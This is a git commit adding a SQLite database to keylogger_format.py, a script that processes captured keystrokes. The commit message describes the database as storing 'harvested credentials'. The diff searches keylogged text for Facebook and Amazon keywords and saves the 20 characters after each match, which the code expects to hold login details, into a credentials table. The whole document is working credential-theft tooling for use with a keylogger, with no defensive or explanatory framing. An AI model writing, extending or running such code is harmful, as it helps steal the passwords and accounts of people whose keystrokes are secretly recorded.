8b96710a533a234500252a22fc570f10e4e7b593
adeptio <mbrinkma13@gmail.com>
2017-02-26 19:47:33 -0800

    Added SQLite3 database for harvested credentials.

--- keylogger_format.py
+++ keylogger_format.py
@@ -4,6 +4,7 @@
 # Purpose: Keylogger returns data as one character (Keydown event) per line.  We want words to show up horizontally, separated by spaces.  
 
 import re
+import sqlite3
 
 # Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
 # then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
@@ -11,7 +12,7 @@ import re
 # The blank space character has been altered to '`' because of problems with .join eliminating spaces.
 # Of course, if someone had '`' in a password, it would be an inconvenience.   
 print('[*] Reading file ...' + '\n') 
-file = ['`' if letter == '' else letter for letter in open('keyloggeroutput.txt').read().split('\n')]
+file = ['`' if letter == '' else letter for letter in open('Visuals.txt').read().split('\n')]
 
 print('[*] Formatting file ...' + '\n')
 the_string = ''
@@ -25,14 +26,24 @@ log_formatted.close()
 print('[*] Formatted output saved in keylog_formatted.txt' + '\n')
 
 
-# Search for keywords and print whether they are found so user can 'CTRL+F' for analysis.  
-key1 = ['facebook', 'Facebook', 'fbook']
-key2 = ['amazon', 'Amazon']
+# Search for keywords and print whether they are found. 
+key1 = ['facebook', 'Facebook', 'fbook', 'face', 'Face']
+key2 = ['amazon', 'Amazon', 'amaz']
 key_list = [key1, key2]
+
+conn = sqlite3.connect('auths.db')
+c = conn.cursor()
+c.execute("CREATE TABLE IF NOT EXISTS credentials (keyword text, rough_creds text)")
+
+rough_credentials = '' # String containing the 20 characters following a detected keyword (likely contains auth info)
+sub_found = 0 # Starting index of keyword if found 
 
 print('[*] Searching for keywords ...')
 for i in key_list:
 	for k in i:
-		if k in the_string:
+		sub_found = the_string.find(k)
+		if (sub_found != -1):
 			print('"{0}" found in log output!'.format(k))
-		
+			for inst in re.finditer(k, the_string):
+				rough_credentials = the_string[inst.end():inst.end() + 20] # Store keyword & following 20 char to database table.
+				c.execute("INSERT INTO credentials VALUES (?, ?)", (k, rough_credentials))
